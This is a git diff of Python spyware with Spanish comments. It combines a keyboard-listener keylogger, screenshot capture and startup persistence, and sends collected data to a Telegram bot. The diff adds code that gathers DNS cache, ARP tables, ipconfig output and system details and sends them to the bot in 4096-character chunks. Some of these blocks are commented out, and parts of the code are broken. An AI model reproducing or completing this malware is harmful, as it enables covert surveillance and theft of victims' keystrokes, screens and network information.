@@ -1,6 +1,9 @@
 # import libs
+import socket
+
+from pip._vendor import requests
 from pynput.keyboard import Listener  # Escucha eventos del teclado
-import os  # Lib para copiar archivos
+import os, os.path, platform, ctypes
 #import socket  # Verifica internet
 import threading  # procesos multihilos
 from datetime import datetime  # Devuelve fecha y hora actual
@@ -10,6 +13,7 @@ import random  # Genera numeros
 import telepot  # Telegram API
 import string  # Lib genera textos
 import time  # Contar segundos
+
 from PIL import ImageGrab  # Toma capturas de pantalla
 
 #region Config
@@ -54,6 +58,16 @@ class Util:
 
     def random_char(self, number=4):  # Genera letras aleatorias [Longitud según el argumento]
         return ''.join(random.choice(string.ascii_letters) for x in range(number))
+
+    def split_string(n, st):
+        lst = ['']
+        for i in str(st):
+            l = len(lst) - 1
+            if len(lst[l]) < n:
+                lst[l] += i
+            else:
+                lst += [i]
+        return lst
 
 class Screenshot:
     def _delete(self, name):
@@ -314,8 +328,101 @@ class Key:
         with Listener(on_press=press) as listener:
             listener.join()
 
+class RedInformation:
+    def __init__(self):
+        pass
+    def __ip_config(self):
+        response = ""
+        lines = os.popen('ipconfig /displaydns')
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+
+        return response
+
+
+    def send(self):
+        bot = telepot.Bot(Config.TelegramBot().TOKEN)
+        chat_id = Config.TelegramBot().ID[0]
+        response = ''
+        bot.sendChatAction(chat_id, 'typing')
+
+        responses = Util().split_string(4096, response)
+        for resp in responses:
+            bot.sendMessage(chat_id, resp)
+
+
+
+
+
+
+
+
+
+
 if __name__ == '__main__':
-    print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
-    threading.Thread(target=StartUp().infinite).start()
-    threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
-    threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
+    #print("PATH Screenshot: " + Config().Screenshot().PATH) if Config().DEBUG else False
+    #threading.Thread(target=StartUp().infinite).start()
+    #threading.Thread(target=Key().listen_key).start() if Config().Keylogger().ACTIVE else False
+    #threading.Thread(target=Screenshot().send).start() if Config().Screenshot().ACTIVE else False
+
+
+    bot = telepot.Bot(Config.TelegramBot().TOKEN)
+    chat_id = Config.TelegramBot().ID[0]
+    response = ''
+    #bot.sendChatAction(chat_id, 'typing')
+
+    # Red info
+    """
+    lines = os.popen('arp -a -N ' + internalIP())
+    for line in lines:
+        line.replace('\n\n', '\n')
+        response += line
+
+    bot.sendMessage(chat_id, response)
+    #
+    """
+    # Indo DNS
+    """
+    bot.sendChatAction(chat_id, 'typing')
+    lines = os.popen('ipconfig /displaydns')
+    for line in lines:
+        line.replace('\n\n', '\n')
+        response += line
+
+    responses = split_string(4096, response)
+    for resp in responses:
+        bot.sendMessage(chat_id, resp)
+    """
+    # Ip config
+    """
+    bot.sendChatAction(chat_id, 'typing')
+        lines = os.popen('ipconfig /all')
+        for line in lines:
+            line.replace('\n\n', '\n')
+            response += line
+    """
+    """ # Usuario
+    bot.sendChatAction(chat_id, 'typing')
+    info = ''
+    for pc_info in platform.uname():
+        info += '\n' + pc_info
+    info += '\n' + 'Username: ' + "usuario"
+    response = info
+    """
+
+
+
+
+
+    """
+
+    responses = split_string(4096, response)
+    for resp in responses:
+        bot.sendMessage(chat_id, resp)
+
+    """
+
+
+
+
